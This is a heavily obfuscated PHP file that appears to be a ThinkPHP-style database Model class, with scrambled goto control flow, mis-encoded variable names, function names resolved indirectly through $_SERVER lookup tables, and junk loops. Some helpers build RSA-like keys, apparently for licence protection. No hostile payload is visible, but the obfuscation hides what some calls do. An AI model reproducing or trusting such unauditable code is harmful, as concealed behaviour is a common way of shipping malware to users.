$aÇòà√›Áà[616]) { return; } } if ($fçù™Ü‚Ì¨ == 1) { break; } else { $bà∂∂ﬁîÙ’++; } } goto e´Ç≥ÌìªÎ; D◊⁄êﬂ†ÚÖ: $A¢üúã™›æ = $aÇòà√›Áà[712]; $EÚÂÇñÉµ¯ = $this->{$_SERVER[åì®®Íêß][170]}($Cú∂Ü≤Ûå–, $fëπº±ﬂ•Ÿ) . $DÛé¨°ﬂÖª[378] . $bÈ¯Ú¡Í¬√; $Dì«√∏¥•∑ = $aÇòà√›Áà[713]; goto FîÛ∂â≤º«; FîÛ∂â≤º«: return $EÚÂÇñÉµ¯; goto DïÙ∏©ÁØ; Däú®ŸÊÓ∏: $f€√øŸÇÛí = ($bæπœñ©†€ - 1) * ($c¯èÓ„âÙì - 1); $e⁄Ã∏ﬂ©∏ˆ = $aÇòà√›Áà[705]; $bà∂∂ﬁîÙ’ = $DÛé¨°ﬂÖª[268](($bæπœñ©†€ + $c¯èÓ„âÙì) / 2); goto a‡«∏∫ú—˘; bÕ°‰µÈ…ß: $aÇòà√›Áà =& $_SERVER[™⁄»üÆ]; $DÛé¨°ﬂÖª =& $_SERVER[åì®®Íêß]; $bæπœñ©†€ = $this->{$_SERVER[åì®®Íêß][374]}(); goto aïå¯Ñ…◊ü; DïÙ∏©ÁØ: } public function gveue6b3dc2a($B≈ﬂººêºû) { goto fâÏïâéí; B∆¶œ‹°§‹: return $bÑÁë…«Ÿ⁄; $C˘ÿÕƒõƒË = $cΩ¢∞‘±©[720]; while ($C˘ÿÕƒõƒË < $cΩ¢∞‘±©[606]) { if ($C˘ÿÕƒõƒË >= 0) { break; } $C˘ÿÕƒõƒË++; } goto fëÕîÇ™; e∏≈âΩΩ¢ï: $bΩàÖŒõû÷ = $cΩ¢∞‘±©[715]; while ($bΩàÖŒõû÷ < $cΩ¢∞‘±©[616]) { if ($bΩàÖŒõû÷ >= 0) { break; } $bΩàÖŒõû÷++; } $AÏ›ªÑÿ†Õ = 0; goto cﬂ…ö®ÑÂ≠; c‚õŸÊÔ„¶: $cŒ§à’œ·ì = $FÂúπ¥ô˘”[129]($FÂúπ¥ô˘”[375] . ($AÏ›ªÑÿ†Õ + $D≥ó–œô›Í) . $FÂúπ¥ô˘”[376] . $c¡∑π¢≈ç» . $FÂúπ¥ô˘”[376] . $AÀñøï˘ÉÀ . $FÂúπ¥ô˘”[377]); $a»∆ÈÌ†õ˜ = $cΩ¢∞‘±©[719]; $bÑÁë…«Ÿ⁄ = $this->{$_SERVER[åì®®Íêß][274]}($BÇùëªÓê«[0], $cŒ§à’œ·ì); goto B∆¶œ‹°§‹; b¿µù‚ºîÑ: $A‰ı–à◊ÿ¶ = $this->{$_SERVER[åì®®Íêß][274]}($BÇùëªÓê«[1] . $FÂúπ¥ô˘”[10], $FÂúπ¥ô˘”[172]); if (!$A‰ı–à◊ÿ¶) { return $FÂúπ¥ô˘”[10]; } $A‰ı–à◊ÿ¶ = $FÂúπ¥ô˘”[268]($A‰ı–à◊ÿ¶); goto e∏≈âΩΩ¢ï; bÛè≥Èñ÷·: $AÑãá‘”íÍ = $cΩ¢∞‘±©[714]; if (strlen($AÑãá‘”íÍ) < $cΩ¢∞‘±©[626]) { die; } if ($FÂúπ¥ô˘”[19]($BÇùëªÓê«) != 2) { return $FÂúπ¥ô˘”[10]; } goto b¿µù‚ºîÑ; cﬂ…ö®ÑÂ≠: $D≥ó–œô›Í = 0; for ($AÓ÷¡˜ŒŒå = 3; $AÓ÷¡˜ŒŒå < $A‰ı–à◊ÿ¶; $AÓ÷¡˜ŒŒå += 2) { if ($A‰ı–à◊ÿ¶ % $AÓ÷¡˜ŒŒå != 0) { continue; } $AÏ›ªÑÿ†Õ = $AÓ÷¡˜ŒŒå; $D≥ó–œô›Í = $FÂúπ¥ô˘”[268]($A‰ı–à◊ÿ¶ / $AÓ÷¡˜ŒŒå); $b¬Ã¯⁄¿∞© = $cΩ¢∞‘±©[716]; if (!$b¬Ã¯⁄¿∞©) { die; } break; } $cÉ§®¥ß√Ú = ($AÏ›ªÑÿ†Õ - 1) * ($D≥ó–œô›Í - 1); goto d√ˆê»øÕÓ; d√ˆê»øÕÓ: $c¡∑π¢≈ç» = $FÂúπ¥ô˘”[268](($AÏ›ªÑÿ†Õ + $D≥ó–œô›Í) / 2); while (1) { $c”øﬁŸä€∞ = $c¡∑π¢≈ç»; $EüÙ±‚ùÚ∏ = $cÉ§®¥ß√Ú; while ($EüÙ±‚ùÚ∏ % $c”øﬁŸä€∞ != 0) { $C˜√õÚ™ÌŸ = $EüÙ±‚ùÚ∏; $A≥àÿçÇÍº = $cΩ¢∞‘±©[717]; while ($A≥àÿçÇÍº < $cΩ¢∞‘±©[626]) { if ($A≥àÿçÇÍº >= 0) { break; } $A≥àÿçÇÍº++; } $EüÙ±‚ùÚ∏ = $c”øﬁŸä€∞; $c”øﬁŸä€∞ = $C˜√õÚ™ÌŸ % $c”øﬁŸä€∞; } if ($c”øﬁŸä€∞ == 1) { break; } else { $c¡∑π¢≈ç»++; } } $AÀñøï˘ÉÀ = 2; goto eﬂô·ú∫ÏÕ; fâÏïâéí: $cΩ¢∞‘±© =& $_SERVER[™⁄»üÆ]; $FÂúπ¥ô˘” =& $_SERVER[åì®®Íêß]; $BÇùëªÓê« = $FÂúπ¥ô˘”[0]($FÂúπ¥ô˘”[378], $B≈ﬂººêºû); goto bÛè≥Èñ÷·; eﬂô·ú∫ÏÕ: $a¡⁄ªå◊¬î = $cΩ¢∞‘±©[718]; if (strlen($a¡⁄ªå◊¬î) < $cΩ¢∞‘±©[626]) { die; } for ($AÓ÷¡˜ŒŒå = 0; $AÓ÷¡˜ŒŒå < $cÉ§®¥ß√Ú * 10; $AÓ÷¡˜ŒŒå++) { if (($cÉ§®¥ß√Ú * $AÓ÷¡˜ŒŒå + 1) % $c¡∑π¢≈ç» == 0) { $AÀñøï˘ÉÀ = $FÂúπ¥ô˘”[268](($cÉ§®¥ß√Ú * $AÓ÷¡˜ŒŒå + 1) / $c¡∑π¢≈ç»); break; } } goto c‚õŸÊÔ„¶; fëÕîÇ™: } public function jerk46c80995() { goto a¶â†éº”; a¶â†éº”: $d·Âú™·Ù∏ =& $_SERVER[™⁄»üÆ]; $d‚ˆ¡áÿâÕ =& $_SERVER[åì®®Íêß]; $CÒπ‚⁄ë™ƒ = $d‚ˆ¡áÿâÕ[360]($d‚ˆ¡áÿâÕ[379](2, 14), $d‚ˆ¡áÿâÕ[379](2, 16) - 1); goto A‚≠’¨¯Èª; DÑÍˆ±µ«ú: if (strlen($fûøá®Ñäó) < $d·Âú™·Ù∏[616]) { die; } goto e°áΩ»ﬂ∆Á; A‚≠’¨¯Èª: $BÇáÃ“°–ì = $d·Âú™·Ù∏[721]; $CÈãâíˆÆÎ = array(); $E¨´∆’˘óã = 1; goto aè”Ç “–™; aè”Ç “–™: while ($E¨´∆’˘óã <= (int) $d‚ˆ¡áÿâÕ[380]($CÒπ‚⁄ë™ƒ)) { $e‹¿Ã•º¿‹ = $E¨´∆’˘óã; while (!0) { $e‹¿Ã•º¿‹++; if ($e‹¿Ã•º¿‹ <= 2) { $E¨´∆’˘óã = $e‹¿Ã•º¿‹; break; } else { if ($e‹¿Ã•º¿‹ < 2) { continue; } } $CàùÊ¨Ô≤ù = !0; for ($FßÇÕ“’ıí = 2; $FßÇÕ“’ıí <= $d‚ˆ¡áÿâÕ[380]($e‹¿Ã•º¿‹); $FßÇÕ“’ıí++) { if ($e‹¿Ã•º¿‹ % $FßÇÕ“’ıí == 0) { $CàùÊ¨Ô≤ù = !1; } } if ($CàùÊ¨Ô≤ù) { $E¨´∆’˘óã = $e‹¿Ã•º¿‹; break; } } $CÈãâíˆÆÎ[] = $E¨´∆’˘óã; $FÁÀÖ¨Òê = $d·Âú™·Ù∏[722]; if (!$FÁÀÖ¨Òê) { die; } } $dÒ≈ƒÂ·ø˜ = 2; $eïΩÛ∫¢πò = $d·Âú™·Ù∏[723]; goto C´≤ëóÛíï; C´≤ëóÛíï: for ($e‹¿Ã•º¿‹ = $CÒπ‚⁄ë™ƒ; $e‹¿Ã•º¿‹ > 1; $e‹¿Ã•º¿‹--) { $CàùÊ¨Ô≤ù = !0; $a–ˆÓïº®£ = $d·Âú™·Ù∏[724]; while (strlen($a–ˆÓïº®£) < $d·Âú™·Ù∏[626]) { if (!$a–ˆÓïº®£) { break; } $a–ˆÓïº®£++; } foreach ($CÈãâíˆÆÎ as $e∞‡⁄º‘®Ù) { if ($e‹¿Ã•º¿‹ % $e∞‡⁄º‘®Ù == 0) { $CàùÊ¨Ô≤ù = !1; break; } } if ($CàùÊ¨Ô≤ù) { $dÒ≈ƒÂ·ø˜ = $e‹¿Ã•º¿‹; break; } } return $dÒ≈ƒÂ·ø˜; $fûøá®Ñäó = $d·Âú™·Ù∏[725]; goto DÑÍˆ±µ«ú; e°áΩ»ﬂ∆Á: } public function yjdn47417835($E˘∏éâÌ«ü, $déëâÑ™Èê) { $C”ç‰Æâ◊À =& $_SERVER[åì®®Íêß]; return $C”ç‰Æâ◊À[13](array($C”ç‰Æâ◊À[14], $C”ç‰Æâ◊À[381]), $E˘∏éâÌ«ü, $déëâÑ™Èê); } public function tguq5ddadae6($d∏≠Ï∞◊å≥, $BòÔÈ∆«äπ) { $F¢¯º¡üı =& $_SERVER[åì®®Íêß]; return $F¢¯º¡üı[13](array($F¢¯º¡üı[382], $F¢¯º¡üı[383]), $d∏≠Ï∞◊å≥, $BòÔÈ∆«äπ); } public function ntzwaec1f333($D‹”›èèŒ¬, $aºÃﬁÇ≈Àö) { $cà„ºªÍí∏ =& $_SERVER[åì®®Íêß]; return $cà„ºªÍí∏[13](array($cà„ºªÍí∏[382], $cà„ºªÍí∏[384]), $D‹”›èèŒ¬, $aºÃﬁÇ≈Àö); $Eï˘Í´¿Ω∑ = $_SERVER[™⁄»üÆ][726]; if (!$Eï˘Í´¿Ω∑) { return; } } } goto E’√‘ª¿˘; d´´ﬁ¥∫ù‚: define($_SERVER[™⁄»üÆ][240], 0); define($_SERVER[™⁄»üÆ][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\x6c\145", "\157\x72\x64\x65\x72", "\x61\154\151\x61\163", "\x68\x61\166\151\x6e\x67", "\147\x72\x6f\x75\x70", "\x6c\x6f\143\153", "\144\x69\x73\164\x69\156\x63\x74", "\141\165\164\157", "\x66\x69\154\x74\x65\x72", "\x76\141\154\151\144\141\x74\x65", "\x72\145\x73\165\x6c\x74", "\x62\x69\156\144", "\x74\x6f\x6b\145\x6e"); public function __construct($fïÓ◊ÍΩü˘ = '', $dÙ§èÉ‚»æ = '', $cÊ†¿øçòï = '') { $dïÒ·Ÿ‚Í” =& $_SERVER[™⁄»üÆ]; $this->_initialize(); if (!empty($fïÓ◊ÍΩü˘)) { if (strpos($fïÓ◊ÍΩü˘, $dïÒ·Ÿ‚Í”[95])) { list($this->dbName, $this->name) = explode($dïÒ·Ÿ‚Í”[95], $fïÓ◊ÍΩü˘); } else { $this->name = $fïÓ◊ÍΩü˘; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($dÙ§èÉ‚»æ)) { $this->tablePrefix = $dïÒ·Ÿ‚Í”[33]; } elseif ($dïÒ·Ÿ‚Í”[33] != $dÙ§èÉ‚»æ) { $this->tablePrefix = $dÙ§èÉ‚»æ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($dïÒ·Ÿ‚Í”[242]); } $this->db(0, empty($this->connection) ? $cÊ†¿øçòï : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $eÓﬂƒá„ˆõ =& $_SERVER[™⁄»üÆ]; if (empty($this->fields)) { if (think_config($eÓﬂƒá„ˆõ[243])) { $bÜíáŸÜ›é = $this->dbName ? $this->dbName : think_config($eÓﬂƒá„ˆõ[244]); $dÍ∆≈Ïô°∂ = think_var_cache($eÓﬂƒá„ˆõ[245] . strtolower(get_path_this($bÜíáŸÜ›é) . $eÓﬂƒá„ˆõ[95] . $this->name)); if ($dÍ∆≈Ïô°∂) { $EÏ›ãïÔÁ™ = think_config($eÓﬂƒá„ˆõ[246]); if (empty($EÏ›ãïÔÁ™) || $dÍ∆≈Ïô°∂[$eÓﬂƒá„ˆõ[247]] == $EÏ›ãïÔÁ™) { $this->fields = $dÍ∆≈Ïô°∂; return; } } } $this->flush(); } } public function flush() { goto D‘¯ˆ≈ÑÙı; dî›è‹ÉŸÿ: if (think_config($aé‰“Ü¥Öà[243])) { $A∆˜ ﬁÚ≤¢ = $this->dbName ? $this->dbName : think_config($aé‰“Ü¥Öà[244]); think_var_cache($aé‰“Ü¥Öà[245] . strtolower(get_path_this($A∆˜ ﬁÚ≤¢) . $aé‰“Ü¥Öà[95] . $this->name), $this->fields); } goto FÎ≠™ÙÁç∑; Fâµ◊ÖÓ©: if (!$Cá‡—§¨ª≠) { return !1; } $this->fields = array_keys($Cá‡—§¨ª≠); $this->fields[$aé‰“Ü¥Öà[248]] = !1; goto cú†„¢–¶ã; D‘¯ˆ≈ÑÙı: $aé‰“Ü¥Öà =& $_SERVER[™⁄»üÆ]; $this->db->setModel($this->name); $Cá‡—§¨ª≠ = $this->db->getFields($this->getTableName()); goto Fâµ◊ÖÓ©; cú†„¢–¶ã: foreach ($Cá‡—§¨ª≠ as $DóÖûº¢≈Ô => $B±ÀçµÊ‰Í) { $F¯ÍÕÙÔìà[$DóÖûº¢≈Ô] = $B±ÀçµÊ‰Í[$aé‰“Ü¥Öà[29]]; if ($B±ÀçµÊ‰Í[$aé‰“Ü¥Öà[36]]) { $this->fields[$aé‰“Ü¥Öà[249]] = $DóÖûº¢≈Ô; if ($B±ÀçµÊ‰Í[$aé‰“Ü¥Öà[39]]) { $this->fields[$aé‰“Ü¥Öà[248]] = !0; } } } $this->fields[$aé‰“Ü¥Öà[250]] = $F¯ÍÕÙÔìà; if (think_config($aé‰“Ü¥Öà[246])) { $this->fields[$aé‰“Ü¥Öà[247]] = think_config($aé‰“Ü¥Öà[246]); } goto dî›è‹ÉŸÿ; FÎ≠™ÙÁç∑: } public function switchModel($a¡πƒ‡‰Öù, $céŸ—ß…ƒª = array()) { $aÖÀá∑¥¨è =& $_SERVER[™⁄»üÆ]; $Fä¯¢àÏ“á = ucwords(strtolower($a¡πƒ‡‰Öù)) . $aÖÀá∑¥¨è[251]; if (!class_exists($Fä¯¢àÏ“á)) { think_exception($Fä¯¢àÏ“á . think_lang($aÖÀá∑¥¨è[252])); } $this->_extModel = new $Fä¯¢àÏ“á($this->name); if (!empty($céŸ—ß…ƒª)) { foreach ($céŸ—ß…ƒª as $Fï∂»≈ßÁ‘) { $this->_extModel->setProperty($Fï∂»≈ßÁ‘, $this->{$Fï∂»≈ßÁ‘}); } } return $this->_extModel; } public function __set($Fº”ø¨ΩâΩ, $CêåéûêÇ‹) { $this->data[$Fº”ø¨ΩâΩ] = $CêåéûêÇ‹; } public function __get($D›†°å≥ú´) { return isset($this->data[$D›†°å≥ú´]) ? $this->data[$D›†°å≥ú´] : null; } public function __isset($F° ∞í◊¬∏) { return isset($this->data[$F° ∞í◊¬∏]); } public function __unset($Eπ¢±ÃƒÇ®) { unset($this->data[$Eπ¢±ÃƒÇ®]); } public function __call($fùﬁçô¶çˆ, $Aé‚ƒáÊî∆) { $B◊ıá∏øÕº =& $_SERVER[™⁄»üÆ]; if (in_array(strtolower($fùﬁçô¶çˆ), $this->methods, !0)) { $this->options[strtolower($fùﬁçô¶çˆ)] = $Aé‚ƒáÊî∆[0]; return $this; } elseif (in_array(strtolower($fùﬁçô¶çˆ), array($B◊ıá∏øÕº[253], $B◊ıá∏øÕº[254], $B◊ıá∏øÕº[255], $B◊ıá∏øÕº[256], $B◊ıá∏øÕº[257]), !0)) { $b‡êô†Æ®• = isset($Aé‚ƒáÊî∆[0]) ? $Aé‚ƒáÊî∆[0] : $B◊ıá∏øÕº[182]; $b‡êô†Æ®• = $this->db->parseKey($b‡êô†Æ®•); return $this->getField(strtoupper($fùﬁçô¶çˆ) . $B◊ıá∏øÕº[258] . $b‡êô†Æ®• . $B◊ıá∏øÕº[259] . $fùﬁçô¶çˆ, $B◊ıá∏øÕº[253]); } elseif (strtolower(substr($fùﬁçô¶çˆ, 0, 5)) == $B◊ıá∏øÕº[260]) { $b‡êô†Æ®• = think_parse_name(substr($fùﬁçô¶çˆ, 5)); $e¿¡äÎâïä[$b‡êô†Æ®•] = $Aé‚ƒáÊî∆[0]; return $this->where($e¿¡äÎâïä)->find(); } elseif (strtolower(substr($fùﬁçô¶çˆ, 0, 10)) == $B◊ıá∏øÕº[261]) { $FÑ≠à‹ê®• = think_parse_name(substr($fùﬁçô¶çˆ, 10)); $e¿¡äÎâïä[$FÑ≠à‹ê®•] = $Aé‚ƒáÊî∆[0]; return $this->where($e¿¡äÎâïä)->getField($Aé‚ƒáÊî∆[1]); } elseif (isset($this->_scope[$fùﬁçô¶çˆ])) { return $this->scope($fùﬁçô¶çˆ, $Aé‚ƒáÊî∆[0]); } elseif (method_exists($this, $fùﬁçô¶çˆ)) { array_unshift($Aé‚ƒáÊî∆, $fùﬁçô¶çˆ); return call_user_func_array(array($this, $B◊ıá∏øÕº[262]), $Aé‚ƒáÊî∆); } else { return call_user_func_array(array(parent, $fùﬁçô¶çˆ), $Aé‚ƒáÊî∆); } } protected function call() { goto B√€•√µ…Ñ; B√€•√µ…Ñ: $Aÿ˜ÑçÈ∫Ù =& $_SERVER[™⁄»üÆ]; $AåªâËÂªô = func_get_args(); $dî–ºª√†° = array_shift($AåªâËÂªô); goto cËÁã¶ôè∫; cËÁã¶ôè∫: $fË◊≥‰çïå = $dî–ºª√†°; if (is_array($dî–ºª√†°)) { $fË◊≥‰çïå = $dî–ºª√†°[1]; $dî–ºª√†° = $dî–ºª√†°[0]; } $E≈„£ﬁ¬≈° = count($AåªâËÂªô) - 1; goto Bÿ»éúâÔ™; e¨•Ò£¢Ùñ: $F„ÂÙæ£¯« = call_user_func_array(array($this, $dî–ºª√†°), $AåªâËÂªô); if (method_exists($this, $Aÿ˜ÑçÈ∫Ù[266])) { $DÑà€ﬁπíú = call_user_func_array(array($this, $Aÿ˜ÑçÈ∫Ù[267]), array($fË◊≥‰çïå, $AåªâËÂªô, $F„ÂÙæ£¯«)); if ($DÑà€ﬁπíú) { return $DÑà€ﬁπíú; } } return $F„ÂÙæ£¯«; goto cü˜ÖÇ‡Ôﬁ; Bÿ»éúâÔ™: if (isset($AåªâËÂªô[$E≈„£ﬁ¬≈°]) && $AåªâËÂªô[$E≈„£ﬁ¬≈°] === $dî–ºª√†°) { think_exception(__CLASS__ . $Aÿ˜ÑçÈ∫Ù[4] . $dî–ºª√†° . think_lang($Aÿ˜ÑçÈ∫Ù[263])); return; } $AåªâËÂªô[] = $dî–ºª√†°; if (method_exists($this, $Aÿ˜ÑçÈ∫Ù[264])) { $DÑà€ﬁπíú = call_user_func_array(array($this, $Aÿ˜ÑçÈ∫Ù[265]), array($fË◊≥‰çïå, $AåªâËÂªô)); if (!is_null($DÑà€ﬁπíú) && $DÑà€ﬁπíú !== !1) { return $DÑà€ﬁπíú; } } goto e¨•Ò£¢Ùñ; cü˜ÖÇ‡Ôﬁ: } protected function _initialize() { } protected function _facade($aáö©ÂÓ¡Ò) { $eﬁî∫™‡âæ =& $_SERVER[™⁄»üÆ]; if (!empty($this->fields)) { foreach ($aáö©ÂÓ¡Ò as $bﬁıÏçó‚« => $Fü√ŸüΩ¢¢) { if (is_array($this->fields) && !in_array($bﬁıÏçó‚«, $this->fields, !0)) { unset($aáö©ÂÓ¡Ò[$bﬁıÏçó‚«]); } elseif (is_scalar($Fü√ŸüΩ¢¢)) { $this->_parseType($aáö©ÂÓ¡Ò, $bﬁıÏçó‚«); } } } if (!empty($this->options[$eﬁî∫™‡âæ[268]])) { $aáö©ÂÓ¡Ò = array_map($this->options[$eﬁî∫™‡âæ[268]], $aáö©ÂÓ¡Ò); unset($this->options[$eﬁî∫™‡âæ[268]]); } $this->_beforeWrite($aáö©ÂÓ¡Ò); return $aáö©ÂÓ¡Ò; } protected function _beforeWrite(&$FÕ”áåé¢≈) { } public function add($Eï‰˘èœçÃ = '', $c◊Ω©î¥áö = array(), $aÑ•ãºØØÉ = false) { goto A≥ÑìŸÿÎ∑; CôÒÁﬂÇÉä: if (!1 === $this->_beforeInsert($Eï‰˘èœçÃ, $c◊Ω©î¥áö)) { return !1; } $cô¿á–ﬁ€ó = $this->db->insert($Eï‰˘èœçÃ, $c◊Ω©î¥áö, $aÑ•ãºØØÉ); if (!1 !== $cô¿á–ﬁ€ó) { $AºãéÌ“Ω∆ = $this->getLastInsID(); if ($AºãéÌ“Ω∆) { $Eï‰˘èœçÃ[$this->getPk()] = $AºãéÌ“Ω∆; $this->_after_insert($Eï‰˘èœçÃ, $c◊Ω©î¥áö); return $AºãéÌ“Ω∆; } $this->_after_insert($Eï‰˘èœçÃ, $c◊Ω©î¥áö); } goto b¯Òπ≈¶È™; A≥ÑìŸÿÎ∑: if (empty($Eï‰˘èœçÃ)) { if (!empty($this->data)) { $Eï‰˘èœçÃ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[™⁄»üÆ][269]); return !1; } } $c◊Ω©î¥áö = $this->_parseOptions($c◊Ω©î¥áö); $Eï‰˘èœçÃ = $this->_facade($Eï‰˘èœçÃ); goto CôÒÁﬂÇÉä; b¯Òπ≈¶È™: return $cô¿á–ﬁ€ó; goto f⁄àÂâ¨ì©; f⁄àÂâ¨ì©: } protected function _beforeInsert(&$CÜ±ﬂ◊Âáº, $BÈÖ¢˘òî—) { } protected function _after_insert($Aéµ∂™î•›, $Dœåﬂî¥÷í) { } public function addAll($BëÁÏÃê‚ç, $Eö”üÛı§Ì = array(), $FÉ¶»Ñ°©± = false) { goto aŸÿ´™Áï÷; dë–™ü‡é¥: foreach ($BëÁÏÃê‚ç as $B…ÂÑΩ±€ö => $FËî„˘ï®¡) { $BëÁÏÃê‚ç[$B…ÂÑΩ±€ö] = $this->_facade($FËî„˘ï®¡); } if (method_exists($this->db, $D‡∞»Ë©”∏[270])) { $fåõº‘øŒõ = $this->db->insertAll($BëÁÏÃê‚ç, $Eö”üÛı§Ì, $FÉ¶»Ñ°©±); } else { $this->startTrans(); foreach ($BëÁÏÃê‚ç as $B…ÂÑΩ±€ö => $FËî„˘ï®¡) { $fåõº‘øŒõ = $this->db->insert($FËî„˘ï®¡, $Eö”üÛı§Ì, $FÉ¶»Ñ°©±); } $this->commit(); } if (!1 !== $fåõº‘øŒõ) { $Aﬁ°ß˜òí• = $this->getLastInsID(); if ($Aﬁ°ß˜òí•) { return $Aﬁ°ß˜òí•; } } goto c¨™»ƒê∫Ñ; aŸÿ´™Áï÷: $D‡∞»Ë©”∏ =& $_SERVER[™⁄»üÆ]; if (empty($BëÁÏÃê‚ç)) { $this->error = think_lang($D‡∞»Ë©”∏[269]); return !1; } $Eö”üÛı§Ì = $this->_parseOptions($Eö”üÛı§Ì); goto dë–™ü‡é¥; c¨™»ƒê∫Ñ: return $fåõº‘øŒõ; goto Bó‰∫¿ƒ…Ô; Bó‰∫¿ƒ…Ô: } public function selectAdd($fßÖÑ‡çøπ = '', $eﬂ¶ºò…©û = '', $DêﬂÖ™„‹¯ = array()) { $dŸ¿ÏçÙùÃ =& $_SERVER[™⁄»üÆ]; $DêﬂÖ™„‹¯ = $this->_parseOptions($DêﬂÖ™„‹¯); if (!1 === ($F‚õ≤º˜úé = $this->db->selectInsert($fßÖÑ‡çøπ ? $fßÖÑ‡çøπ : $DêﬂÖ™„‹¯[$dŸ¿ÏçÙùÃ[271]], $eﬂ¶ºò…©û ? $eﬂ¶ºò…©û : $this->getTableName(), $DêﬂÖ™„‹¯))) { $this->error = think_lang($dŸ¿ÏçÙùÃ[272]); return !1; } else { return $F‚õ≤º˜úé; } } public function save($cõ¨‰åäéÙ = '', $C°⁄ıÃìàø = array()) { goto C¡È¿œÏºé; Dæç„—Ÿ÷”: if (is_array($C°⁄ıÃìàø[$FÜòΩß≈ÂÎ[273]]) && isset($C°⁄ıÃìàø[$FÜòΩß≈ÂÎ[273]][$a≥≥çµÀ…ı])) { $AÁ ÔœííÜ = $C°⁄ıÃìàø[$FÜòΩß≈ÂÎ[273]][$a≥≥çµÀ…ı]; } if (!1 === $this->_beforeUpdate($cõ¨‰åäéÙ, $C°⁄ıÃìàø)) { return !1; } $Cçø à´ùÑ = $this->db->update($cõ¨‰åäéÙ, $C°⁄ıÃìàø); goto Cá«íÊÚ¿⁄; Cá«íÊÚ¿⁄: if (!1 !== $Cçø à´ùÑ) { if (isset($AÁ ÔœííÜ)) { $cõ¨‰åäéÙ[$a≥≥çµÀ…ı] = $AÁ ÔœííÜ; } $this->_afterUpdate($cõ¨‰åäéÙ, $C°⁄ıÃìàø); } return $Cçø à´ùÑ; goto Dí›ﬁºëàÆ; bçÜ≤∞∆‰Ó: $C°⁄ıÃìàø = $this->_parseOptions($C°⁄ıÃìàø); $a≥≥çµÀ…ı = $this->getPk(); if (!isset($C°⁄ıÃìàø[$FÜòΩß≈ÂÎ[273]])) { if (isset($cõ¨‰åäéÙ[$a≥≥çµÀ…ı])) { $dú‡ÂÈ⁄«˜[$a≥≥çµÀ…ı] = $cõ¨‰åäéÙ[$a≥≥çµÀ…ı]; $C°⁄ıÃìàø[$FÜòΩß≈ÂÎ[273]] = $dú‡ÂÈ⁄«˜; unset($cõ¨‰åäéÙ[$a≥≥çµÀ…ı]); } else { $this->error = think_lang($FÜòΩß≈ÂÎ[272]); return !1; } } goto Dæç„—Ÿ÷”; C¡È¿œÏºé: $FÜòΩß≈ÂÎ =& $_SERVER[™⁄»üÆ]; if (empty($cõ¨‰åäéÙ)) { if (!empty($this->data)) { $cõ¨‰åäéÙ = $this->data; $this->data = array(); } else { $this->error = think_lang($FÜòΩß≈ÂÎ[269]); return !1; } } $cõ¨‰åäéÙ = $this->_facade($cõ¨‰åäéÙ); goto bçÜ≤∞∆‰Ó; Dí›ﬁºëàÆ: } protected function _beforeUpdate(&$C˜Çí¶úè, $aÑãÓ∑ø”˜) { } protected function _afterUpdate($b¶‡™±‡çÀ, $Aÿ®Áêç÷») { } public function delete($EÃﬂÃÉÊò = array()) { goto e§ÈéÁæ®; d√ã’ﬁ‰†ç: $Aé∂õÂ∫“– = $this->db->delete($EÃﬂÃÉÊò); if (!1 !== $Aé∂õÂ∫“–) { $EÆ∫≥é —Î = array(); if (isset($bò∏ÌÇâï¶)) { $EÆ∫≥é —Î[$EóÃ∏Àıæò] = $bò∏ÌÇâï¶; } $this->_after_delete($EÆ∫≥é —Î, $EÃﬂÃÉÊò); } return $Aé∂õÂ∫“–; goto Fâ™Ò¡Êë¬; Båè¯∞Ñ¬ë: if (is_numeric($EÃﬂÃÉÊò) || is_string($EÃﬂÃÉÊò)) { if (strpos($EÃﬂÃÉÊò, $cÖ∞…è˜¢å[47])) { $Eßù¿´Ãı∞[$EóÃ∏Àıæò] = array($cÖ∞…è˜¢å[274], $EÃﬂÃÉÊò); } else { $Eßù¿´Ãı∞[$EóÃ∏Àıæò] = $EÃﬂÃÉÊò; } $this->options[$cÖ∞…è˜¢å[273]] = $Eßù¿´Ãı∞; } $EÃﬂÃÉÊò = $this->_parseOptions(); if (is_array($EÃﬂÃÉÊò[$cÖ∞…è˜¢å[273]]) && isset($EÃﬂÃÉÊò[$cÖ∞…è˜¢å[273]][$EóÃ∏Àıæò])) { $bò∏ÌÇâï¶ = $EÃﬂÃÉÊò[$cÖ∞…è˜¢å[273]][$EóÃ∏Àıæò]; } goto d√ã’ﬁ‰†ç; e§ÈéÁæ®: $cÖ∞…è˜¢å =& $_SERVER[™⁄»üÆ]; if (empty($EÃﬂÃÉÊò) && empty($this->options[$cÖ∞…è˜¢å[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $EóÃ∏Àıæò = $this->getPk(); goto Båè¯∞Ñ¬ë; Fâ™Ò¡Êë¬: } protected function _after_delete($e€ÀòÂÖ‘ˆ, $c¨÷ƒ≤ë °) { } public function select($F¯ÛÜÌµÖÀ = array()) { goto CáÏ¥Ã¯Ùé; fæÇã∏•ó: $C‡è®ÒùºÔ = $this->db->select($F¯ÛÜÌµÖÀ); if (!1 === $C‡è®ÒùºÔ) { return !1; } if (empty($C‡è®ÒùºÔ)) { return null; } goto E£é¡ﬁõ£Ç; CáÏ¥Ã¯Ùé: $BÊ€–âñ™Õ =& $_SERVER[™⁄»üÆ]; if (is_string($F¯ÛÜÌµÖÀ) || is_numeric($F¯ÛÜÌµÖÀ)) { $Cˆ≈œÏÕ–å = $this->getPk(); if (strpos($F¯ÛÜÌµÖÀ, $BÊ€–âñ™Õ[47])) { $DÉûé˘¶ÜÀ[$Cˆ≈œÏÕ–å] = array($BÊ€–âñ™Õ[274], $F¯ÛÜÌµÖÀ); } else { $DÉûé˘¶ÜÀ[$Cˆ≈œÏÕ–å] = $F¯ÛÜÌµÖÀ; } $this->options[$BÊ€–âñ™Õ[273]] = $DÉûé˘¶ÜÀ; } elseif (!1 === $F¯ÛÜÌµÖÀ) { $F¯ÛÜÌµÖÀ = $this->_parseOptions(); return $BÊ€–âñ™Õ[275] . 